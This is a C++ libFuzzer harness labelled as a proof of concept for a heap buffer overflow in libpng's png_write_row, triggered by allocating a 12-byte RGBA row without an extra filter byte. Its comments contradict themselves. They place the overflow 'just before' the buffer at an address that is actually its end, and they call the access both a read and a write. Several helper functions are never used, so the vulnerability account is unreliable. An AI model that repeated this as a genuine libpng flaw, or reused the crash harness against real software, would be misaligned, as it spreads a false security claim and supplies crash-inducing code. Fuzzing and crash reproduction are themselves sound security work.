#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <cstdio>

#include "png.h"

struct BufState {
  uint8_t* data;
  size_t size;
  size_t position;
};

struct PngHandler {
  png_structp png_ptr = nullptr;
  png_infop info_ptr = nullptr;
  png_bytep row_ptr = nullptr;
  BufState* buf_state = nullptr;
  
  ~PngHandler() {
    if (row_ptr) png_free(png_ptr, row_ptr);
    if (info_ptr)
      png_destroy_write_struct(&png_ptr, &info_ptr);
    else if (png_ptr)
      png_destroy_write_struct(&png_ptr, nullptr);
    
    if (buf_state) {
      free(buf_state->data); // Free the data buffer
      delete buf_state;
    }
  }
};

void* limited_malloc(png_structp, png_alloc_size_t size) {
  return (size > 8000000) ? nullptr : malloc(size);
}

void default_free(png_structp, png_voidp ptr) {
  free(ptr);
}

void user_write_data(png_structp png_ptr, png_bytep data, size_t length) {
  auto* state = static_cast<BufState*>(png_get_io_ptr(png_ptr));
  if (state->position + length > state->size) {
    // Reallocate if needed
    size_t new_size = state->size * 2;
    if (new_size < state->position + length)
      new_size = state->position + length;
    
    uint8_t* new_data = static_cast<uint8_t*>(realloc(state->data, new_size));
    if (new_data == nullptr) {
      png_error(png_ptr, "write buffer allocation error");
      return;
    }
    
    state->data = new_data;
    state->size = new_size;
  }
  
  memcpy(state->data + state->position, data, length);
  state->position += length;
}

void user_flush_data(png_structp png_ptr) {
  // No-op for memory buffer
  (void)png_ptr;
}

/*
 * Proof of Concept for libpng heap buffer overflow vulnerability in png_write_row
 * 
 * This vulnerability occurs because png_write_row attempts to write the filter
 * type byte at position -1 of the buffer, but our allocation doesn't account
 * for this extra byte.
 *
 * The crash shows:
 * - A buffer allocated at 0x502000000c90 with size 12 bytes
 * - Overflow at 0x502000000c9c which is just before the buffer
 * - The read is of size 20 at that address
 * - This causes a heap-buffer-overflow
 */

// Memory write function for libpng - discards output
static void png_memory_write(png_structp png_ptr, png_bytep data, png_size_t length) {
  (void)png_ptr;
  (void)data;
  (void)length;
}

// Dummy flush function
static void png_memory_flush(png_structp png_ptr) {
  (void)png_ptr;
}

extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
  (void)data; // Unused - we're using hardcoded values
  (void)size; // Unused
  
  png_structp png_ptr;
  png_infop info_ptr;
  
  // Parameter values that triggered the crash
  uint32_t width = 3;      // Creates a row width of exactly 12 bytes (3 pixels * 4 channels)
  uint32_t height = 1;
  int color_type = PNG_COLOR_TYPE_RGBA;  // 4 channels
  int bit_depth = 8;       // 1 byte per channel
  
  std::printf("Creating image with width=%u, height=%u, color_type=%d, bit_depth=%d\n", 
              width, height, color_type, bit_depth);
  
  // Calculate row size (width * channels * bytes_per_channel)
  // For RGBA with 8-bit depth: width * 4 * 1
  png_uint_32 row_size = width * 4;
  std::printf("Row size: %u bytes\n", row_size);
  
  // Create PNG write structure
  png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
  if (!png_ptr) {
    std::fprintf(stderr, "Could not create PNG write struct\n");
    return 1;
  }
  
  // Create PNG info structure
  info_ptr = png_create_info_struct(png_ptr);
  if (!info_ptr) {
    std::fprintf(stderr, "Could not create PNG info struct\n");
    png_destroy_write_struct(&png_ptr, NULL);
    return 1;
  }
  
  // Setup error handling
  if (setjmp(png_jmpbuf(png_ptr))) {
    std::fprintf(stderr, "Error during PNG creation\n");
    png_destroy_write_struct(&png_ptr, &info_ptr);
    return 1;
  }
  
  // Set up custom write function instead of using files
  png_set_write_fn(png_ptr, NULL, png_memory_write, png_memory_flush);
  
  // Set image attributes
  png_set_IHDR(png_ptr, info_ptr, width, height, bit_depth, color_type,
               PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
  
  // Write PNG info
  png_write_info(png_ptr, info_ptr);
  
  // VULNERABILITY: Allocate exactly row_size bytes without the extra +1 for filter byte
  // png_write_row will attempt to write at buffer[-1]
  png_bytep row_data = (png_bytep)malloc(row_size);
  if (!row_data) {
    std::fprintf(stderr, "Out of memory\n");
    png_destroy_write_struct(&png_ptr, &info_ptr);
    return 1;
  }
  
  // Fill with pattern similar to what we saw in the crash (66 99 ff ff...)
  uint8_t pattern[] = {0x66, 0x99, 0xff, 0xff, 0xff, 0x9c, 0xb1, 0x08, 0xd9, 0x00, 0x00, 0x00};
  std::memcpy(row_data, pattern, row_size);
  
  // Debug print before crash
  std::fprintf(stderr, "right before the crash\n");
  std::fprintf(stderr, "row_ptr address: %p, size: %u bytes\n", row_data, row_size);
  std::fprintf(stderr, "First 16 bytes of buffer: ");
  for (uint32_t i = 0; i < (row_size < 16 ? row_size : 16); i++) {
    std::fprintf(stderr, "%02x ", row_data[i]);
  }
  std::fprintf(stderr, "\n");
  std::fprintf(stderr, "=================================================================\n");
  
  // This call will cause a heap buffer overflow - png_write_row tries to write to row_data[-1]
  std::printf("About to write row (buffer overflow will occur here)\n");
  png_write_row(png_ptr, row_data);  // CRASH HAPPENS HERE
  
  // We shouldn't reach here if the crash occurs
  std::printf("Successfully completed (should not reach here if overflow detected)\n");
  
  // Cleanup
  free(row_data);
  png_destroy_write_struct(&png_ptr, &info_ptr);
  
  return 0;
}
